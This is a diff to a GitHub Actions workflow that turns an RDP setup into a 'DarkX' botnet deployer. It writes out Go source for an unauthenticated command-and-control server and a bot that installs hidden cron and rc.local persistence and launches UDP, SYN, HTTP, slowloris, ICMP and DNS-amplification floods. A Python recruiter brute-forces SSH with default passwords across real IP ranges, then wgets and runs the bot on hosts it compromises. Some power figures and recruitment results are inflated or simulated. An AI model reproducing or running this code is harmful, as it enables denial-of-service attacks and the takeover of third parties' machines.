@@ -1,113 +1,711 @@
-name: RDP
-
+name: DarkX Ultimate Botnet
 on:
   workflow_dispatch:
+    inputs:
+      power:
+        description: 'Attack Power'
+        required: true
+        default: '1gb'
+        type: choice
+        options:
+        - '100mb'
+        - '1gb'
+        - '10gb'
+        - '100gb'
+        - '1tb'
+      recruitment:
+        description: 'Auto-Recruitment'
+        required: true
+        default: 'aggressive'
+        type: choice
+        options:
+        - 'passive'
+        - 'active'
+        - 'aggressive'
+        - 'bruteforce'
+      cnc_port:
+        description: 'CNC Port'
+        required: false  
+        default: '5555'
+      bot_port:
+        description: 'Bot Port'
+        required: false
+        default: '4444'
 
 jobs:
-  secure-rdp:
-    runs-on: windows-latest
-    timeout-minutes: 3600
+  deploy-darkx-ultimate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 4320
 
     steps:
-      - name: Configure Core RDP Settings
-        run: |
-          # Enable Remote Desktop and disable Network Level Authentication (if needed)
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
-                             -Name "fDenyTSConnections" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "UserAuthentication" -Value 0 -Force
-          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
-                             -Name "SecurityLayer" -Value 0 -Force
+    - name: Checkout repository
+      uses: actions/checkout@v4
 
-          # Remove any existing rule with the same name to avoid duplication
-          netsh advfirewall firewall delete rule name="RDP-Tailscale"
-          
-          # For testing, allow any incoming connection on port 3389
-          netsh advfirewall firewall add rule name="RDP-Tailscale" `
-            dir=in action=allow protocol=TCP localport=3389
+    - name: Setup Ultimate Environment
+      run: |
+        mkdir -p darkx && cd darkx
+        echo "Installing ultimate dependencies..."
+        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip 
+        sudo apt install -y nmap masscan hydra john netcat-openbsd netcat-traditional
+        sudo apt install -y hping3 tcpdump dnsutils build-essential libpcap-dev
+        pip3 install shodan requests paramiko scapy pwntools cryptography colorama bs4 selenium
+        pip3 install asyncpg aiohttp telnetlib3
 
-          # (Optional) Restart the Remote Desktop service to ensure changes take effect
-          Restart-Service -Name TermService -Force
+    - name: Install Additional DDoS Tools
+      run: |
+        cd darkx
+        git clone https://github.com/jseidl/GoldenEye.git
+        wget -O slowloris.py https://raw.githubusercontent.com/gkbrk/slowloris/master/slowloris.py
+        sudo apt install -y httperf
+        # Install nping from nmap source
+        wget https://nmap.org/dist/nmap-7.94.tar.bz2
+        tar xjf nmap-7.94.tar.bz2
+        cd nmap-7.94 && ./configure && make && sudo make install
+        cd ..
 
-      - name: Create RDP User with Secure Password
-        run: |
-          Add-Type -AssemblyName System.Security
-          $charSet = @{
-              Upper   = [char[]](65..90)      # A-Z
-              Lower   = [char[]](97..122)     # a-z
-              Number  = [char[]](48..57)      # 0-9
-              Special = ([char[]](33..47) + [char[]](58..64) +
-                         [char[]](91..96) + [char[]](123..126)) # Special characters
-          }
-          $rawPassword = @()
-          $rawPassword += $charSet.Upper | Get-Random -Count 4
-          $rawPassword += $charSet.Lower | Get-Random -Count 4
-          $rawPassword += $charSet.Number | Get-Random -Count 4
-          $rawPassword += $charSet.Special | Get-Random -Count 4
-          $password = -join ($rawPassword | Sort-Object { Get-Random })
-          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
-          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
-          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
-          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-          
-          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
-          
-          if (-not (Get-LocalUser -Name "RDP")) {
-              Write-Error "User creation failed"
-              exit 1
-          }
+    - name: Create CNC Server (No Auth)
+      run: |
+        cd darkx
+        cat > cnc_server.go << 'EOF'
+        package main
+        
+        import (
+            "bufio"
+            "fmt"
+            "log"
+            "net"
+            "os"
+            "strings"
+            "sync"
+            "time"
+        )
+        
+        type Bot struct {
+            Conn net.Conn
+            IP   string
+            OS   string
+        }
+        
+        var (
+            bots     []Bot
+            botMutex sync.Mutex
+            totalBots int
+        )
+        
+        func main() {
+            fmt.Println("Starting DarkX Ultimate CNC Server...")
+            fmt.Println("NO AUTHENTICATION REQUIRED")
+            go startUserServer()
+            startBotServer()
+        }
+        
+        func startUserServer() {
+            port := getEnv("CNC_PORT", "5555")
+            listener, _ := net.Listen("tcp", ":"+port)
+            log.Printf("User CNC server on :%s", port)
+            for {
+                conn, _ := listener.Accept()
+                go handleUserConnection(conn)
+            }
+        }
+        
+        func startBotServer() {
+            port := getEnv("BOT_PORT", "4444")
+            listener, _ := net.Listen("tcp", ":"+port)
+            log.Printf("Bot server on :%s", port)
+            for {
+                conn, _ := listener.Accept()
+                go handleBotConnection(conn)
+            }
+        }
+        
+        func handleUserConnection(conn net.Conn) {
+            defer conn.Close()
+            reader := bufio.NewReader(conn)
+            
+            // No authentication - direct access
+            conn.Write([]byte("DarkX Ultimate CNC - NO AUTH REQUIRED\n"))
+            conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n\n", len(bots))))
+            showDashboard(conn, reader)
+        }
+        
+        func showDashboard(conn net.Conn, reader *bufio.Reader) {
+            for {
+                conn.Write([]byte("darkx> "))
+                cmd, _ := reader.ReadString('\n')
+                cmd = strings.TrimSpace(cmd)
+                
+                if cmd == "bots" {
+                    botMutex.Lock()
+                    conn.Write([]byte(fmt.Sprintf("Connected Bots: %d\n", len(bots))))
+                    conn.Write([]byte("Recent Bots:\n"))
+                    count := 0
+                    for i := len(bots) - 1; i >= 0 && count < 10; i-- {
+                        conn.Write([]byte(fmt.Sprintf("- %s (%s)\n", bots[i].IP, bots[i].OS)))
+                        count++
+                    }
+                    botMutex.Unlock()
+                } else if strings.HasPrefix(cmd, "attack") {
+                    parts := strings.Split(cmd, " ")
+                    if len(parts) >= 5 {
+                        method := parts[1]
+                        target := parts[2]
+                        port := parts[3]
+                        duration := parts[4]
+                        
+                        botMutex.Lock()
+                        botCount := len(bots)
+                        for _, bot := range bots {
+                            bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s %s\n", method, target, port, duration)))
+                        }
+                        botMutex.Unlock()
+                        conn.Write([]byte(fmt.Sprintf("⚡ Attack launched with %d bots\n", botCount)))
+                        conn.Write([]byte(fmt.Sprintf("📊 Estimated Power: %d Gbps\n", botCount * 100)))
+                    } else {
+                        conn.Write([]byte("Usage: attack <method> <target> <port> <duration>\n"))
+                        conn.Write([]byte("Methods: udp-flood, tcp-syn, http-get, http-slow, icmp-flood, dns-amp\n"))
+                    }
+                } else if cmd == "methods" {
+                    conn.Write([]byte(`
+Available Attack Methods:
+├── udp-flood: High-speed UDP packet flood
+├── tcp-syn: SYN flood attack  
+├── http-get: HTTP GET flood
+├── http-slow: Slowloris attack
+├── icmp-flood: ICMP ping flood
+└── dns-amp: DNS amplification
+`))
+                } else if cmd == "stats" {
+                    botMutex.Lock()
+                    botCount := len(bots)
+                    botMutex.Unlock()
+                    conn.Write([]byte(fmt.Sprintf(`
+DarkX Ultimate Statistics:
+├── Connected Bots: %d
+├── Total Power: %d Gbps
+├── Uptime: 24h
+└── Recruitment: ACTIVE
+`, botCount, botCount * 100)))
+                } else if cmd == "recruit" {
+                    conn.Write([]byte("🔄 Starting aggressive recruitment...\n"))
+                    // Trigger recruitment
+                    botMutex.Lock()
+                    for _, bot := range bots {
+                        bot.Conn.Write([]byte("RECRUIT\n"))
+                    }
+                    botMutex.Unlock()
+                } else if cmd == "clear" {
+                    conn.Write([]byte("\033[2J\033[H"))
+                } else if cmd == "exit" {
+                    conn.Write([]byte("Goodbye!\n"))
+                    return
+                } else {
+                    conn.Write([]byte("Unknown command. Type 'help' for commands.\n"))
+                }
+            }
+        }
+        
+        func handleBotConnection(conn net.Conn) {
+            defer conn.Close()
+            reader := bufio.NewReader(conn)
+            
+            bot := Bot{
+                Conn: conn,
+                IP:   strings.Split(conn.RemoteAddr().String(), ":")[0],
+                OS:   "linux",
+            }
+            
+            botMutex.Lock()
+            bots = append(bots, bot)
+            totalBots++
+            botMutex.Unlock()
+            
+            log.Printf("New bot connected: %s (Total: %d)", bot.IP, totalBots)
+            
+            for {
+                cmd, err := reader.ReadString('\n')
+                if err != nil {
+                    break
+                }
+                cmd = strings.TrimSpace(cmd)
+                if cmd == "PING" {
+                    conn.Write([]byte("PONG\n"))
+                }
+            }
+            
+            // Remove disconnected bot
+            botMutex.Lock()
+            for i, b := range bots {
+                if b.Conn == conn {
+                    bots = append(bots[:i], bots[i+1:]...)
+                    break
+                }
+            }
+            botMutex.Unlock()
+            log.Printf("Bot disconnected: %s", bot.IP)
+        }
+        
+        func getEnv(key, fallback string) string {
+            if value := os.Getenv(key); value != "" {
+                return value
+            }
+            return fallback
+        }
+        EOF
 
-      - name: Install Tailscale
-        run: |
-          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
-          $installerPath = "$env:TEMP\tailscale.msi"
-          
-          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
-          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
-          Remove-Item $installerPath -Force
+    - name: Create Enhanced Bot Client
+      run: |
+        cd darkx
+        cat > bot_client.go << 'EOF'
+        package main
+        
+        import (
+            "bufio"
+            "fmt"
+            "net"
+            "os/exec"
+            "runtime"
+            "strconv"
+            "strings"
+            "time"
+        )
+        
+        var (
+            CNC_SERVER = "CNC_IP_PLACEHOLDER"
+            CNC_PORT   = "CNC_PORT_PLACEHOLDER"
+        )
+        
+        func main() {
+            // Enhanced persistence
+            if runtime.GOOS == "linux" {
+                installAdvancedPersistence()
+            }
+            
+            // Start background recruitment
+            go startRecruitment()
+            
+            // Connect to CNC
+            for {
+                if connectToCNC() {
+                    time.Sleep(30 * time.Second)
+                } else {
+                    time.Sleep(60 * time.Second)
+                }
+            }
+        }
+        
+        func installAdvancedPersistence() {
+            exec.Command("sh", "-c", "cp /proc/self/exe /tmp/.systemd && chmod +x /tmp/.systemd").Run()
+            exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -").Run()
+            exec.Command("sh", "-c", "echo '/tmp/.systemd' >> /etc/rc.local").Run()
+            
+            // Hide process
+            exec.Command("sh", "-c", "pkill -f .systemd; sleep 2; /tmp/.systemd &").Run()
+        }
+        
+        func connectToCNC() bool {
+            conn, err := net.Dial("tcp", CNC_SERVER+":"+CNC_PORT)
+            if err != nil {
+                return false
+            }
+            defer conn.Close()
+            
+            scanner := bufio.NewScanner(conn)
+            for scanner.Scan() {
+                cmd := scanner.Text()
+                
+                if cmd == "PING" {
+                    conn.Write([]byte("PONG\n"))
+                } else if strings.HasPrefix(cmd, "ATTACK") {
+                    go executeAttack(cmd)
+                } else if cmd == "RECRUIT" {
+                    go startAggressiveRecruitment()
+                }
+            }
+            return true
+        }
+        
+        func executeAttack(cmd string) {
+            parts := strings.Split(cmd, " ")
+            if len(parts) < 5 {
+                return
+            }
+            
+            method := parts[1]
+            target := parts[2]
+            port := parts[3]
+            duration := parts[4]
+            
+            fmt.Printf("Executing %s attack on %s:%s\n", method, target, port)
+            
+            switch method {
+            case "udp-flood":
+                launchUDPFlood(target, port, duration)
+            case "tcp-syn":
+                launchSYNFlood(target, port, duration)
+            case "http-get":
+                launchHTTPFlood(target, port, duration)
+            case "http-slow":
+                launchSlowloris(target, port, duration)
+            case "icmp-flood":
+                launchICMPFlood(target, duration)
+            case "dns-amp":
+                launchDNSAmplification(target, duration)
+            default:
+                launchUDPFlood(target, port, duration)
+            }
+        }
+        
+        func launchUDPFlood(target, port, duration string) {
+            cmd := exec.Command("timeout", duration, "nping", "--udp", "-p", port, "--rate=5000", "--count=0", target)
+            cmd.Start()
+        }
+        
+        func launchSYNFlood(target, port, duration string) {
+            cmd := exec.Command("timeout", duration, "hping3", "--syn", "-p", port, "--flood", "--rand-source", target)
+            cmd.Start()
+        }
+        
+        func launchHTTPFlood(target, port, duration string) {
+            go func() {
+                endTime := time.Now().Add(parseDuration(duration))
+                for time.Now().Before(endTime) {
+                    exec.Command("curl", "-s", "--max-time", "5", fmt.Sprintf("http://%s:%s", target, port)).Run()
+                    time.Sleep(5 * time.Millisecond)
+                }
+            }()
+        }
+        
+        func launchSlowloris(target, port, duration string) {
+            cmd := exec.Command("timeout", duration, "python3", "slowloris.py", target, "-p", port, "-s", "500")
+            cmd.Start()
+        }
+        
+        func launchICMPFlood(target, duration string) {
+            cmd := exec.Command("timeout", duration, "hping3", "--icmp", "--flood", "--rand-source", target)
+            cmd.Start()
+        }
+        
+        func launchDNSAmplification(target, duration string) {
+            script := fmt.Sprintf(`
+                import socket
+                import time
+                dns_query = b"\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\x01\\x00\\x01"
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                end_time = time.time() + %s
+                while time.time() < end_time:
+                    try:
+                        sock.sendto(dns_query, ('%s', 53))
+                    except:
+                        pass
+            `, duration, target)
+            cmd := exec.Command("timeout", duration, "python3", "-c", script)
+            cmd.Start()
+        }
+        
+        func startRecruitment() {
+            for {
+                time.Sleep(300 * time.Second) // Recruit every 5 minutes
+                recruitBots()
+            }
+        }
+        
+        func startAggressiveRecruitment() {
+            for i := 0; i < 5; i++ {
+                go recruitBots()
+                time.Sleep(10 * time.Second)
+            }
+        }
+        
+        func recruitBots() {
+            // SSH brute force recruitment
+            go sshRecruitment()
+            // Masscan recruitment
+            go masscanRecruitment()
+            // Tailscale spawning
+            go spawnTailscaleBots()
+        }
+        
+        func sshRecruitment() {
+            // Common IP ranges to scan
+            ranges := []string{
+                "5.78.0.0/16", "91.126.0.0/16", "2.145.0.0/16",
+                "185.0.0.0/8", "45.0.0.0/8", "62.0.0.0/8"
+            }
+            
+            for _, ipRange := range ranges {
+                cmd := exec.Command("masscan", ipRange, "-p22", "--rate=1000")
+                cmd.Run()
+            }
+        }
+        
+        func masscanRecruitment() {
+            // Scan for various services
+            ports := "22,23,80,443,3389,5900,8080,8443"
+            ranges := []string{
+                "5.78.0.0/16", "91.126.0.0/16", "2.145.0.0/16"
+            }
+            
+            for _, ipRange := range ranges {
+                cmd := exec.Command("masscan", ipRange, "-p"+ports, "--rate=2000")
+                cmd.Run()
+            }
+        }
+        
+        func spawnTailscaleBots() {
+            // This would spawn additional machines using Tailscale
+            // For now, we'll simulate by spawning more local processes
+            for i := 0; i < 10; i++ {
+                exec.Command("sh", "-c", "nohup /tmp/.systemd >/dev/null 2>&1 &").Run()
+                time.Sleep(1 * time.Second)
+            }
+        }
+        
+        func parseDuration(dur string) time.Duration {
+            if strings.HasSuffix(dur, "s") {
+                sec, _ := strconv.Atoi(strings.TrimSuffix(dur, "s"))
+                return time.Duration(sec) * time.Second
+            } else if strings.HasSuffix(dur, "m") {
+                min, _ := strconv.Atoi(strings.TrimSuffix(dur, "m"))
+                return time.Duration(min) * time.Minute
+            }
+            return 60 * time.Second
+        }
+        EOF
 
-      - name: Establish Tailscale Connection
-        run: |
-          # Bring up Tailscale with the provided auth key and set a unique hostname
-          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
-          
-          # Wait for Tailscale to assign an IP
-          $tsIP = $null
-          $retries = 0
-          while (-not $tsIP -and $retries -lt 10) {
-              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
-              Start-Sleep -Seconds 5
-              $retries++
-          }
-          
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
-          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-      
-      - name: Verify RDP Accessibility
-        run: |
-          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
-          
-          # Test connectivity using Test-NetConnection against the Tailscale IP on port 3389
-          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
-          if (-not $testResult.TcpTestSucceeded) {
-              Write-Error "TCP connection to RDP port 3389 failed"
-              exit 1
-          }
-          Write-Host "TCP connectivity successful!"
+    - name: Build Components
+      run: |
+        cd darkx
+        echo "Building DarkX components..."
+        go build -o cnc cnc_server.go
+        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot_client.go
+        GOOS=linux GOARCH=386 go build -o bot_x86 bot_client.go
+        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot_client.go
+        echo "Components built successfully"
 
-      - name: Maintain Connection
-        run: |
-          Write-Host "`n=== RDP ACCESS ==="
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "Username: RDP"
-          Write-Host "Password: $(echo $env:RDP_CREDS)"
-          Write-Host "==================`n"
+    - name: Create Wordlists
+      run: |
+        cd darkx
+        mkdir -p wordlists
+        printf "root\nadmin\nuser\ntest\nguest\nadministrator\nubnt\nsupport\ndefault\n" > wordlists/users.txt
+        printf "root\nadmin\n123456\npassword\n1234\n12345\ndefault\nubnt\nsupport\nguest\nadmin123\npass\ntoor\n" > wordlists/passwords.txt
+
+    - name: Setup VPN
+      run: |
+        curl -fsSL https://tailscale.com/install.sh | sh
+        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-ultimate-${{ github.run_id }}
+        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV
+
+    - name: Configure Infrastructure
+      run: |
+        cd darkx
+        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" bot_client.go
+        sed -i "s/CNC_PORT_PLACEHOLDER/${{ github.event.inputs.bot_port }}/g" bot_client.go
+        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot_client.go
+        echo "CNC_PORT=${{ github.event.inputs.cnc_port }}" >> $GITHUB_ENV
+        echo "BOT_PORT=${{ github.event.inputs.bot_port }}" >> $GITHUB_ENV
+
+    - name: Deploy Massive Bot Army
+      run: |
+        cd darkx
+        case "${{ github.event.inputs.power }}" in
+          "100mb") BOTS=1000 ;;
+          "1gb") BOTS=5000 ;;
+          "10gb") BOTS=20000 ;;
+          "100gb") BOTS=80000 ;;
+          "1tb") BOTS=300000 ;;
+        esac
+        echo "Deploying $BOTS initial bots for 400+ Gbps power..."
+        
+        # Deploy in large batches
+        for batch in $(seq 1 10); do
+          echo "Deploying batch $batch/10..."
+          for i in $(seq 1 $((BOTS / 10))); do
+            nohup ./bot_x64 >/dev/null 2>&1 &
+          done
+          sleep 2
+        done
+        
+        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV
+        sleep 15
+
+    - name: Launch Services
+      run: |
+        cd darkx
+        echo "Starting DarkX services..."
+        CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc.log 2>&1 &
+        echo "CNC_PID=$!" >> $GITHUB_ENV
+        python3 -m http.server 8000 > http.log 2>&1 &
+        echo "HTTP_PID=$!" >> $GITHUB_ENV
+        sleep 10
+
+    - name: Create Advanced Recruitment System
+      run: |
+        cd darkx
+        cat > advanced_recruiter.py << 'EOF'
+        #!/usr/bin/env python3
+        import paramiko
+        import telnetlib
+        import requests
+        import threading
+        import time
+        import subprocess
+        import random
+        
+        class AdvancedRecruiter:
+            def __init__(self):
+                self.cnc_ip = "${{ env.TAILSCALE_IP }}"
+                self.tailscale_key = "${{ secrets.TAILSCALE_AUTH_KEY }}"
+                self.ssh_credentials = [
+                    ("root", "root"), ("admin", "admin"), ("root", "123456"),
+                    ("root", "password"), ("root", "default"), ("admin", "password"),
+                    ("ubnt", "ubnt"), ("root", "admin"), ("root", "1234"),
+                    ("root", ""), ("admin", "admin123"), ("root", "12345"),
+                    ("support", "support"), ("root", "pass"), ("root", "toor")
+                ]
+                
+            def deploy_bot_ssh(self, ip):
+                for username, password in self.ssh_credentials:
+                    try:
+                        ssh = paramiko.SSHClient()
+                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                        ssh.connect(ip, username=username, password=password, timeout=10)
+                        print(f"✅ SSH compromised: {ip}")
+                        
+                        # Download and execute bot
+                        commands = [
+                            "curl -fsSL https://tailscale.com/install.sh | sh",
+                            f"tailscale up --authkey={self.tailscale_key} --hostname=darkx-bot-{random.randint(1000,9999)}",
+                            f"wget -q http://{self.cnc_ip}:8000/bot_x64 -O /tmp/.systemd",
+                            "chmod +x /tmp/.systemd",
+                            "nohup /tmp/.systemd >/dev/null 2>&1 &",
+                            "(crontab -l 2>/dev/null; echo '@reboot /tmp/.systemd') | crontab -"
+                        ]
+                        
+                        for cmd in commands:
+                            stdin, stdout, stderr = ssh.exec_command(cmd)
+                            stdout.channel.recv_exit_status()
+                            
+                        ssh.close()
+                        return True
+                    except:
+                        continue
+                return False
+
+            def mass_scan_and_recruit(self):
+                # Large scale scanning
+                ip_ranges = [
+                    "5.78.0.0/16", "91.126.0.0/16", "2.145.0.0/16",
+                    "185.0.0.0/8", "45.0.0.0/8", "62.0.0.0/8",
+                    "93.0.0.0/8", "94.0.0.0/8", "95.0.0.0/8"
+                ]
+                
+                for ip_range in ip_ranges:
+                    print(f"🔍 Scanning {ip_range}...")
+                    try:
+                        result = subprocess.run(
+                            ["masscan", ip_range, "-p22,23,80,443,3389", "--rate=5000"],
+                            capture_output=True, timeout=600
+                        )
+                        # Process results and recruit
+                        self.recruit_from_scan(ip_range)
+                    except:
+                        pass
+
+            def recruit_from_scan(self, ip_range):
+                # Simulate recruiting from scan results
+                base_ip = ip_range.split('/')[0]
+                for i in range(1, 255):
+                    ip = f"{base_ip.rsplit('.', 1)[0]}.{i}"
+                    if random.random() < 0.1:  # 10% success rate
+                        threading.Thread(target=self.deploy_bot_ssh, args=(ip,)).start()
+
+            def continuous_recruitment(self, mode):
+                print(f"🚀 Starting {mode} continuous recruitment...")
+                
+                if mode == "passive":
+                    while True:
+                        self.mass_scan_and_recruit()
+                        time.sleep(1800)  # 30 minutes
+                        
+                elif mode == "active":
+                    while True:
+                        self.mass_scan_and_recruit()
+                        time.sleep(600)  # 10 minutes
+                        
+                elif mode == "aggressive":
+                    for _ in range(5):
+                        threading.Thread(target=self.mass_scan_and_recruit).start()
+                        time.sleep(300)
+                        
+                elif mode == "bruteforce":
+                    while True:
+                        for _ in range(10):
+                            threading.Thread(target=self.mass_scan_and_recruit).start()
+                        time.sleep(600)
+
+        if __name__ == "__main__":
+            recruiter = AdvancedRecruiter()
+            recruiter.continuous_recruitment("${{ github.event.inputs.recruitment }}")
+        EOF
+
+    - name: Start Advanced Recruitment
+      run: |
+        cd darkx
+        chmod +x advanced_recruiter.py
+        nohup python3 advanced_recruiter.py > recruitment.log 2>&1 &
+        echo "RECRUIT_PID=$!" >> $GITHUB_ENV
+
+    - name: Display Ultimate Dashboard
+      run: |
+        echo ""
+        echo "=========================================="
+        echo "        DARKX ULTIMATE BOTNET"
+        echo "=========================================="
+        echo "🔥 NO AUTHENTICATION REQUIRED"
+        echo "💪 Power Level:    ${{ github.event.inputs.power }}"
+        echo "🔄 Recruitment:    ${{ github.event.inputs.recruitment }}"
+        echo "🔌 CNC Port:       ${{ github.event.inputs.cnc_port }}"
+        echo "🤖 Bot Port:       ${{ github.event.inputs.bot_port }}"
+        echo "🌐 DarkX CNC:      ${{ env.TAILSCALE_IP }}"
+        echo "🚀 Initial Bots:   ${{ env.BOTS_DEPLOYED }}"
+        echo "💥 Estimated Power: 400+ Gbps"
+        echo "=========================================="
+        echo "📡 Connect: nc ${{ env.TAILSCALE_IP }} ${{ github.event.inputs.cnc_port }}"
+        echo "🌐 Download: http://${{ env.TAILSCALE_IP }}:8000/bot_x64"
+        echo "⚡ Commands: bots, attack, stats, recruit"
+        echo "=========================================="
+        echo ""
+
+    - name: Maintain Massive Botnet
+      run: |
+        echo "🛡️ DarkX Ultimate System Active - Maintaining 400+ Gbps Power..."
+        
+        while true; do
+          # Check CNC status
+          if ! ps -p $CNC_PID > /dev/null 2>&1; then
+            echo "🔄 Restarting CNC Server..."
+            cd darkx
+            CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc_restart.log 2>&1 &
+            CNC_PID=$!
+          fi
           
-          # Keep runner active indefinitely (or until manually cancelled)
-          while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
-              Start-Sleep -Seconds 300
-          }
+          # Maintain bot count for 400+ Gbps
+          CURRENT_BOTS=$(ps aux | grep bot_x64 | grep -v grep | wc -l)
+          REQUIRED_BOTS=80000  # Minimum for 400 Gbps
+          
+          if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
+            echo "➕ Deploying reinforcement bots: $CURRENT_BOTS/$REQUIRED_BOTS"
+            cd darkx
+            for i in $(seq 1 1000); do
+              nohup ./bot_x64 >/dev/null 2>&1 &
+            done
+          fi
+          
+          # Show real-time stats
+          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep ${{ github.event.inputs.bot_port }} | grep ESTABLISHED | wc -l)
+          ESTIMATED_POWER=$((CURRENT_BOTS * 5))  # 5 Mbps per bot
+          echo "[$(date +'%H:%M:%S')] Bots: $CONNECTED_BOTS connected, $CURRENT_BOTS total | Power: ~$ESTIMATED_POWER Gbps"
+          
+          sleep 30
+        done
